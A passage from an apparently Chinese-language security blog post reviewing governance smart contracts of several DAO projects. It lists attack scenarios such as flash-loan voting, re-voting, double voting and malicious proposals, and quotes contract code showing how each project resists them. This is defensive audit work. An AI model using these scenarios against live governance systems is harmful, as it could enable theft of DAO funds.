class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">canCloseProposal</span>(<span class="params">uint _proposalId</span>)</span></span><br><span class="line"><span class="function">    ...</span></span><br><span class="line"><span class="function">    <span class="title">if</span> (<span class="params">numberOfMembers == proposalVoteTally[_proposalId].voters</span></span></span><br><span class="line"><span class="function"><span class="params">      || dateUpdate.add(_closingTime</span>) &lt;= <span class="title">now</span>)</span></span><br><span class="line"><span class="function">      <span class="title">return</span> 1;</span></span><br></pre></td></tr></table></figure><p>但有一个复杂的问题——用户转移代币的能力在每次投票后的 7 天内被锁定 <a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L911" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tokenInstance.lockForMemberVote(msg.sender, tokenHoldingTime);</span><br></pre></td></tr></table></figure><p>因此，从技术上讲，黑客可以进行闪电贷款，从市场中提取NXM代币，在同一笔交易中投票和执行提案。但他们仍然需要归还贷款，这需要从执行的提案中获得不低于闪电贷款本身的利润。但是，由于发现<a href="https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa" target="_blank" rel="noopener">calldata验证漏洞</a>后引入的各种限制，似乎很难提出成功的攻击。</p><h2 id="Keep3r-Network"><a href="#Keep3r-Network" class="headerlink" title="Keep3r Network"></a>Keep3r Network</h2><p>该项目使用类似于<a href="https://github.com/keep3r-network/keep3r.network/blob/a6897007db6e656e0e310ed7ee4ad42904fe2794/contracts/Keep3r.sol#L633" target="_blank" rel="noopener">MiniMeToken</a>的令牌。它通过<code>getPriorVotes（）</code>在提案创建块之前的一个区块计算投票权。可以得出同样的结论。</p><h1 id="不正确的重新投票"><a href="#不正确的重新投票" class="headerlink" title="不正确的重新投票"></a>不正确的重新投票</h1><p>如果合同允许用户对提案重新投票，但它错误地减去了用户的旧投票，则可能会出现漏洞。</p><p>需要检查以下危险情况：</p><ul><li>投票支持不存在的提案;</li><li>投票→转让→投票;</li><li>在创建提案的同一区块中投票支持提案;</li><li>使用损坏的参数投票，但使用相同的提案 ID;</li><li>重播链下交易。</li></ul><p>这些类型的漏洞以前在MakerDAO和<a href="https://blog.openzeppelin.com/makerdao-critical-vulnerability/" target="_blank" rel="noopener">KP3R Network</a>等项目中遇到过。</p><h2 id="Aragon-1"><a href="#Aragon-1" class="headerlink" title="Aragon"></a>Aragon</h2><p>可以在<code>Aragon</code>重新投票，但它可以正确添加/减去以前的投票权<a href="https://github.com/aragon/aragon-apps/blob/b72da2c6606a361d0160d5d78fb534018ba3ce91/apps/voting/contracts/Voting.sol#L316" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint256 voterStake = token.balanceOfAt(_voter, vote_.snapshotBlock);</span><br><span class="line">VoterState state = vote_.voters[_voter];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果投票者以前投票过，我们就减少计票。</span></span><br><span class="line"><span class="keyword">if</span> (state == VoterState.Yea) &#123;</span><br><span class="line">    vote_.yea = vote_.yea.sub(voterStake);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (state == VoterState.Nay) &#123;</span><br><span class="line">    vote_.nay = vote_.nay.sub(voterStake);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为不存在的提案投票"><a href="#为不存在的提案投票" class="headerlink" title="为不存在的提案投票"></a>为不存在的提案投票</h3><p>投票方法上有一个 voteExists 修饰符，因此无法投票给不存在的提案 <a href="https://github.com/aragon/aragon-apps/blob/b72da2c6606a361d0160d5d78fb534018ba3ce91/apps/voting/contracts/Voting.sol#L154" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">vote</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _voteId, </span></span></span><br><span class="line"><span class="function"><span class="params">    bool _supports, </span></span></span><br><span class="line"><span class="function"><span class="params">    bool _executesIfDecided</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">external</span> <span class="title">voteExists</span>(<span class="params">_voteId</span>)</span></span><br></pre></td></tr></table></figure><h3 id="其他可能情况"><a href="#其他可能情况" class="headerlink" title="其他可能情况"></a>其他可能情况</h3><p>用户的投票权不能转移和使用在同一提案中，因为Aragon在创建提案之前在一个区块中使用<code>MinimeToken</code>的余额。</p><h2 id="X-DAO-1"><a href="#X-DAO-1" class="headerlink" title="X-DAO"></a>X-DAO</h2><p>X-DAO中的投票发生在链下，没有对同一提案重新投票的机制。如果用户签署了拒绝，他们仍然可以发出已签名的approve，并且approve将被计算在内。但不能反过来做——只计算赞成票<a href="https://github.com/xdao-app/xdao-contracts/blob/855c2d6aa4016d09ae357abaff945ceb8af82347/contracts/core/Dao.sol#L281" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; signers.length; i++) &#123;</span><br><span class="line">    share += balanceOf(signers[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (share * <span class="number">100</span> &lt; totalSupply() * quorum) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>签名的投票不能计算两次<a href="https://github.com/xdao-app/xdao-contracts/blob/855c2d6aa4016d09ae357abaff945ceb8af82347/contracts/core/Dao.sol#L278" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(!_hasDuplicate(signers), &quot;DAO: signatures are not unique.&quot;);</span><br></pre></td></tr></table></figure><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>要投票，用户签署一个提案，该提案只是一组数据：目标地址，调用数据，msg值，nonce，时间戳，block.chainid和X-DAO实例的地址。因此，既不可能在不同的以太坊链上重播用户的签名投票，也不可能在另一个 X-DAO 实例上重播，甚至不可能在另一个具有不同随机数 <a href="https://github.com/xdao-app/xdao-contracts/blob/855c2d6aa4016d09ae357abaff945ceb8af82347/contracts/core/Dao.sol#L240" target="_blank" rel="noopener">[→]</a> 的提案上重播：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTxHash</span></span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function"><span class="title">return</span></span></span><br><span class="line"><span class="function">    <span class="title">keccak256</span>(<span class="params">abi.encode(</span></span></span><br><span class="line"><span class="function"><span class="params">        address(this</span>),</span></span><br><span class="line"><span class="function">        <span class="title">_target</span>,</span></span><br><span class="line"><span class="function">        <span class="title">_data</span>,</span></span><br><span class="line"><span class="function">        <span class="title">_value</span>,</span></span><br><span class="line"><span class="function">        <span class="title">_nonce</span>,</span></span><br><span class="line"><span class="function">        <span class="title">_timestamp</span>,</span></span><br><span class="line"><span class="function">        <span class="title">block</span>.<span class="title">chainid</span></span></span><br><span class="line"><span class="function">    ));</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>提案也不能重播 <a href="https://github.com/xdao-app/xdao-contracts/blob/855c2d6aa4016d09ae357abaff945ceb8af82347/contracts/core/Dao.sol#L197" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(!executedTx[txHash], &quot;DAO: voting already executed.&quot;);</span><br></pre></td></tr></table></figure><h2 id="Snowball-Finance"><a href="#Snowball-Finance" class="headerlink" title="Snowball Finance"></a>Snowball Finance</h2><p>用户不能为不存在的提案投票，但可以对同一提案重新投票。合同正确地减去了他们之前关于重新投票的决定。用户代币被锁定在托管合约中，无法转移。</p><h2 id="Spirit-Swap"><a href="#Spirit-Swap" class="headerlink" title="Spirit Swap"></a>Spirit Swap</h2><p>用户只能选择和投票代币权重。用户可以每周投票一次，但无法重新投票。</p><h2 id="Keep3r-Network-1"><a href="#Keep3r-Network-1" class="headerlink" title="Keep3r Network"></a>Keep3r Network</h2><p>Keep3r网络的行为与Aragon类似，但用户不能对同一提案进行两次投票。</p><p>对不存在的提案进行投票不符合要求 <a href="https://github.com/keep3r-network/keep3r.network/blob/a6897007db6e656e0e310ed7ee4ad42904fe2794/contracts/Keep3rGovernance.sol#L473" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_castVote</span>...</span></span><br><span class="line"><span class="function">    ...</span></span><br><span class="line"><span class="function">    <span class="title">require</span>(<span class="params">state(proposalId</span>) == <span class="title">ProposalState</span>.<span class="title">Active</span>, "<span class="title">Governance</span>::<span class="title">_castVote</span>: <span class="title">voting</span> <span class="title">is</span> <span class="title">closed</span>.");</span></span><br></pre></td></tr></table></figure><p>也不可能重新投票<a href="https://github.com/keep3r-network/keep3r.network/blob/a6897007db6e656e0e310ed7ee4ad42904fe2794/contracts/Keep3rGovernance.sol#L476" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(receipt.hasVoted &#x3D;&#x3D; false, &quot;Governance::_castVote: voter already voted.&quot;);</span><br></pre></td></tr></table></figure><h2 id="Nexus-Mutual-1"><a href="#Nexus-Mutual-1" class="headerlink" title="Nexus Mutual"></a>Nexus Mutual</h2><p>不可能对不存在的提案进行投票，因为以下要求将失败<a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L282" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function submitVote(uint _proposalId, uint _solutionChosen) external &#123;</span><br><span class="line">    ...</span><br><span class="line">    require(allProposalData[_proposalId].propStatus &#x3D;&#x3D; uint(Governance.ProposalStatus.VotingStarted), &quot;Not allowed&quot;);</span><br></pre></td></tr></table></figure><p>用户只能为提案投票一次 <a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L859" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function _submitVote(uint _proposalId, uint _solution) internal &#123;</span><br><span class="line">    ...</span><br><span class="line">    require(memberProposalVote[msg.sender][_proposalId] &#x3D;&#x3D; 0, &quot;Not allowed&quot;);</span><br><span class="line">    ...</span><br><span class="line">    memberProposalVote[msg.sender][_proposalId] &#x3D; totalVotes;</span><br></pre></td></tr></table></figure><h1 id="缺少提案验证"><a href="#缺少提案验证" class="headerlink" title="缺少提案验证"></a>缺少提案验证</h1><p>如果提案属性未经过完全验证，那么黑客可能会有社会工程机会创建看起来良性的破坏性提案。</p><p>解决以下问题：</p><ol><li>提案如何在网站上显示？</li><li>黑客可以在提案中提供任意脚本或调用数据吗？</li><li>黑客能否在恶意提案中提供任意良性描述？</li><li>普通用户很难确定提案脚本的真正作用吗？</li></ol><p>在<a href="https://bean.money/blog/beanstalk-governance-exploit" target="_blank" rel="noopener">Beanstalk</a>和<a href="https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa" target="_blank" rel="noopener">Nexus Mutual</a>等项目中，已经遇到过弱验证。</p><h2 id="Aragon-2"><a href="#Aragon-2" class="headerlink" title="Aragon"></a>Aragon</h2><p><code>Aragon</code>的新提案采用任意执行脚本和元数据 <a href="https://github.com/aragon/aragon-apps/blob/b72da2c6606a361d0160d5d78fb534018ba3ce91/apps/voting/contracts/Voting.sol#L126" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function newVote(bytes _executionScript, string _metadata) external auth(CREATE_VOTES_ROLE) returns (uint256 voteId)</span><br></pre></td></tr></table></figure><p>元数据被发出但不保存在存储中，因此暗示后端将解析区块链中的事件，以显示提案作者地址和描述 <a href="https://github.com/aragon/aragon-apps/blob/b72da2c6606a361d0160d5d78fb534018ba3ce91/apps/voting/contracts/Voting.sol#L298" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emit StartVote(voteId, msg.sender, _metadata);</span><br></pre></td></tr></table></figure><p>因此，可以提供任意执行脚本。因此，核实数据的责任落在了选民身上。</p><h2 id="X-DAO-2"><a href="#X-DAO-2" class="headerlink" title="X-DAO"></a>X-DAO</h2><p>在 X-DAO 中创建提案没有链上方法。</p><p>可以在 <a href="https://www.xdao.app/137/ecosystem" target="_blank" rel="noopener">xdao.app</a> 上创建链下提案，有两点需要注意：</p><ol><li>默认情况下，目标地址及其呼叫数据处于隐藏状态，因此用户可能会错过恶意意图。请参阅<a href="https://www.xdao.app/137/dao/0x60620f047049511b6c7734bd6715800de22d3a73/votingPage/0x99455859248fc849abbed4363012657ce9c3646aed1e98e8b15db67484926360" target="_blank" rel="noopener">链接</a>中的提案示例</li><li>可以为提案指定任意提案标题和描述：<a href="https://www.xdao.app/137/dao/0x60620f047049511b6c7734bd6715800de22d3a73/votingPage/0x99455859248fc849abbed4363012657ce9c3646aed1e98e8b15db67484926360" target="_blank" rel="noopener">链接</a></li></ol><p>因此，核实数据的责任落在了选民身上。</p><h2 id="Snowball-Finance-1"><a href="#Snowball-Finance-1" class="headerlink" title="Snowball Finance"></a>Snowball Finance</h2><p>Snowball Finance 的一份新提案提出了以下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function propose(</span><br><span class="line">    string calldata _title,</span><br><span class="line">    string calldata _metadata,</span><br><span class="line">    uint256 _votingPeriod,</span><br><span class="line">    address _target,</span><br><span class="line">    uint256 _value,</span><br><span class="line">    bytes memory _data</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>并将所有这些存储在合约的存储中，包括msg.sender。</p><p>对调用数据没有限制。因此，核实数据的责任落在了选民身上。</p><h2 id="Keep3r-Network-2"><a href="#Keep3r-Network-2" class="headerlink" title="Keep3r Network"></a>Keep3r Network</h2><p>Keep3r Network 中的新提案需要目标、msg 值、calldata 和其他元数据的列表 <a href="https://github.com/keep3r-network/keep3r.network/blob/a6897007db6e656e0e310ed7ee4ad42904fe2794/contracts/Keep3rGovernance.sol#L340" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function propose(</span><br><span class="line">    address[] memory targets,</span><br><span class="line">    uint256[] memory values,</span><br><span class="line">    string[] memory signatures,</span><br><span class="line">    bytes[] memory calldatas,</span><br><span class="line">    string memory description</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>攻击者仍可以提供任意调用数据。因此，核实数据的责任落在了选民身上。</p><h1 id="无转移验证"><a href="#无转移验证" class="headerlink" title="无转移验证"></a>无转移验证</h1><p>令牌锁定机制应检查已批准的 transferFrom 调用（以及其他类似传输的方法）的返回值：</p><ul><li>如果对 transferFrom 函数的调用失败，则 Aragon Minime 令牌返回 false。</li></ul><p>这种类型的漏洞以前在<a href="https://halborn.com/explained-the-forcedao-hack-april-2021/" target="_blank" rel="noopener">ForceDAO</a>中遇到过。</p><h2 id="Nexus-Mutual-2"><a href="#Nexus-Mutual-2" class="headerlink" title="Nexus Mutual"></a>Nexus Mutual</h2><p>Nexus Mutual 通过 tokenInstance.lockForMemberVote（） 方法锁定代币，而无需使用 transferFrom <a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/token/NXMToken.sol#L252" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function lockForMemberVote(</span><br><span class="line">    address _of, </span><br><span class="line">    uint _days</span><br><span class="line">) public onlyOperator &#123;</span><br><span class="line">    if (_days.add(now) &gt; isLockedForMV[_of])</span><br><span class="line">        isLockedForMV[_of] &#x3D; _days.add(now);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Snowball-Finance和Spirit-Swap"><a href="#Snowball-Finance和Spirit-Swap" class="headerlink" title="Snowball Finance和Spirit Swap"></a>Snowball Finance和Spirit Swap</h2><p>Snowball Finance和Spirit Swap正在使用类似的托管合约来锁定代币一段时间。两种检查传输都会导致 <a href="https://github.com/Layer3Org/spiritswap-core/blob/f730bcb4a96088f4878dffc6b578afdfe42db945/SpiritV2/contracts/SpiritV1/inSpirit.vy#L377" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">assert ERC20(self.token).transferFrom(_addr, self, _value)</span><br><span class="line">...</span><br><span class="line">assert ERC20(self.token).transfer(msg.sender, value)</span><br></pre></td></tr></table></figure><blockquote><p>Aragon，X-DAO和Keep3r网络均没有锁定机制。</p></blockquote><h1 id="投票窗口小"><a href="#投票窗口小" class="headerlink" title="投票窗口小"></a><strong>投票窗口小</strong></h1><p>投票窗口过小，会导致对某些提案持消极倾向的用户和否决权持有者可能没有时间作出反应。特别是当法定人数小于 50% 时。</p><h2 id="Aragon-3"><a href="#Aragon-3" class="headerlink" title="Aragon"></a>Aragon</h2><p>投票和执行是开放的投票时间 <a href="https://github.com/aragon/aragon-apps/blob/b72da2c6606a361d0160d5d78fb534018ba3ce91/apps/voting/contracts/Voting.sol#L406" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_isVoteOpen</span>(<span class="params">Vote storage vote_</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getTimestamp64() &lt; vote_.startDate.add(voteTime) &amp;&amp; !vote_.executed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个全局参数，初始化一次。因此，投票窗口取决于特定项目的初始化。</p><h2 id="X-DAO-3"><a href="#X-DAO-3" class="headerlink" title="X-DAO"></a>X-DAO</h2><p>投票和执行的有效期为3天<a href="https://github.com/xdao-app/xdao-contracts/blob/855c2d6aa4016d09ae357abaff945ceb8af82347/contracts/core/Dao.sol#L191" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint32 public constant VOTING_DURATION &#x3D; 3 days;</span><br><span class="line">...</span><br><span class="line">require(</span><br><span class="line">    _timestamp + VOTING_DURATION &gt;&#x3D; block.timestamp,</span><br><span class="line">    &quot;DAO: voting is over.&quot;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>X-DAO认为，三天应该足以让 DAO 的积极参与者投票。</p><h2 id="Snowball-Finance-2"><a href="#Snowball-Finance-2" class="headerlink" title="Snowball Finance"></a>Snowball Finance</h2><p>Snowball Finance 具有可变但有限的时间段，可由治理机构设置：</p><ul><li>投票期从1天到30天不等;</li><li>执行延迟从 30 秒到 30 天不等;</li><li>有效期为 14 天在<code>Snowball Finance</code>看来，这应该足以让 DAO 的积极参与者投票。</li></ul><h2 id="Spirit-Swap-1"><a href="#Spirit-Swap-1" class="headerlink" title="Spirit Swap"></a>Spirit Swap</h2><p>Spirit Swap 允许每周投票一次<a href="https://github.com/Layer3Org/spiritswap-core/blob/f730bcb4a96088f4878dffc6b578afdfe42db945/SpiritV2/contracts/SpiritV2/StableGaugeProxy.sol#L713" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uint256 public voteDelay &#x3D; 604800;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">modifier hasVoted(address voter) &#123;</span><br><span class="line">    uint256 time &#x3D; block.timestamp - lastVote[voter];</span><br><span class="line">    require(time &gt; voteDelay, &quot;You voted in the last 7 days.&quot;);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Spirit Swap</code>看来，这应该足以让 DAO 的积极参与者投票。</p><h2 id="Nexus-Mutual-3"><a href="#Nexus-Mutual-3" class="headerlink" title="Nexus Mutual"></a>Nexus Mutual</h2><p>提案可以在_closingTime通过后关闭并执行 <a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L711" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function canCloseProposal(uint _proposalId)</span><br><span class="line">...</span><br><span class="line">if (numberOfMembers &#x3D;&#x3D; proposalVoteTally[_proposalId].voters</span><br><span class="line">  || dateUpdate.add(_closingTime) &lt;&#x3D; now)</span><br><span class="line">  return 1;</span><br></pre></td></tr></table></figure><p>在网站上可以看到，根据提案类别的不同，此参数从 3 天到 7 天不等：<br><a href="https://app.nexusmutual.io/governance/categories" target="_blank" rel="noopener">https://app.nexusmutual.io/governance/categories</a></p><p>这应该足以让 DAO 的积极参与者投票。</p><h1 id="双重投票"><a href="#双重投票" class="headerlink" title="双重投票"></a>双重投票</h1><p>黑客可以对具有相同令牌的提案进行两次投票吗？</p><p>建议检查：</p><ul><li>再次投票→转移→投票;</li><li>再次投票→代表→投票;</li><li>修改 vote（） 参数以增加额外的投票权;</li><li>检查重入。</li></ul><h2 id="Aragon-4"><a href="#Aragon-4" class="headerlink" title="Aragon"></a>Aragon</h2><ul><li>投票-转移-投票</li></ul><p>可以在用户之间移动代币，但只有在创建提案之前的区块才重要，因此没有人可以重复投票。</p><ul><li>投票-代表-投票</li></ul><p>默认的阿拉贡合同中没有授权机制。</p><ul><li>修改参数</li></ul><p>没什么可破坏的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function vote(</span><br><span class="line">    uint256 _voteId, </span><br><span class="line">    bool _supports, </span><br><span class="line">    bool _executesIfDecided</span><br><span class="line">) external voteExists(_voteId)</span><br></pre></td></tr></table></figure><ul><li>重入</li></ul><p>投票可以通过 _unsafeExecuteVote（） 导致外部调用，但代码遵循检查效果交互模式，因此不受重入的影响。</p><h2 id="X-DAO-4"><a href="#X-DAO-4" class="headerlink" title="X-DAO"></a>X-DAO</h2><ul><li>投票-转移-投票</li></ul><p>可以签署投票并将代币转移到另一个帐户，以便他们也可以签署另一次投票。但是execute（）方法只计算最终的令牌分发，因此黑客场景不适用。</p><ul><li>其他案例</li></ul><p>没有委托机制，也没有链上 vote（） 方法，因此没有什么可以破坏或尝试重新进入的。</p><h2 id="Spirit-Swap-2"><a href="#Spirit-Swap-2" class="headerlink" title="Spirit Swap"></a>Spirit Swap</h2><p>Spirit Swap投票只能更改协议中的代币权重，并且它以与用户投票相同的方法应用更改。</p><ul><li>投票-转移-投票</li></ul><p>可以投票，等到代币在托管合约中解锁，将代币转移到另一个账户，再次锁定它们，然后投票支持同一个提案。但计算表明，如果代币在整个时间内被锁定，应用的总投票权将是相同的。没有好处。</p><ul><li>投票-代表-投票</li></ul><p>锁定在托管合同中的用户的投票权不能委托给其他用户。</p><ul><li>修改参数</li></ul><p>vote（） 方法采用一个令牌和权重数组，因此检查这些参数是否可以以某种方式修改以增加对某些令牌的额外投票权非常重要。如果两次传递具有相同令牌的数组会发生什么？</p><p>投票方法似乎正确考虑了其所有参数，并且在数组中传递相同的标记不会影响计算的正确性，因为所有权重都除以数组中传递的总权重总和 <a href="https://github.com/Layer3Org/spiritswap-core/blob/f730bcb4a96088f4878dffc6b578afdfe42db945/SpiritV2/contracts/SpiritV2/StableGaugeProxy.sol#L834" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (uint256 i &#x3D; 0; i &lt; _tokenCnt; i++) &#123;</span><br><span class="line">    _totalVoteWeight &#x3D; _totalVoteWeight + _weights[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>重入</li></ul><p>接下来要检查的是是否存在重入。vote（） 方法 <a href="https://github.com/Layer3Org/spiritswap-core/blob/f730bcb4a96088f4878dffc6b578afdfe42db945/SpiritV2/contracts/SpiritV2/StableGaugeProxy.sol#L792" target="_blank" rel="noopener">[→]</a> 中有一个外部调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IBribe(bribes[gauges[_token]])._withdraw(...);</span><br><span class="line">...</span><br><span class="line">IBribe(bribes[_gauge])._deposit(uint256(_tokenWeight), _owner);</span><br></pre></td></tr></table></figure><p>IBribe 合约可以被认为是可信的，因此即使这里可能存在漏洞，它也不会构成威胁。</p><h2 id="Snowball-Finance-3"><a href="#Snowball-Finance-3" class="headerlink" title="Snowball Finance"></a>Snowball Finance</h2><ul><li>投票-转移-投票</li></ul><p>可以投票，等到代币在托管合约中解锁，将代币转移到另一个账户，再次锁定它们，然后投票支持相同的提案。但计算表明，如果代币在整个时间内被锁定，应用的总投票权将是相同的。没有好处。</p><ul><li>投票-代表-投票</li></ul><p>没有授权。</p><ul><li>修改参数</li></ul><p>没什么可破坏的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function vote(uint256 _proposalId, bool _support)</span><br></pre></td></tr></table></figure><ul><li>重入</li></ul><p>vote（） 方法中没有不受信任的外部调用。</p><h2 id="Nexus-Mutual-4"><a href="#Nexus-Mutual-4" class="headerlink" title="Nexus Mutual"></a>Nexus Mutual</h2><ul><li>投票-转移-投票</li></ul><p>这是不可能的，因为用户的传输在每次投票后都会被锁定 <a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L911" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function _setVoteTally(uint _proposalId, uint _solution, uint mrSequence) internal &#123;</span><br><span class="line">    ...</span><br><span class="line">    tokenInstance.lockForMemberVote(msg.sender, tokenHoldingTime);</span><br></pre></td></tr></table></figure><ul><li>投票-代表-投票</li></ul><p>目前不允许委派 <a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L396" target="_blank" rel="noopener">[→]</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function 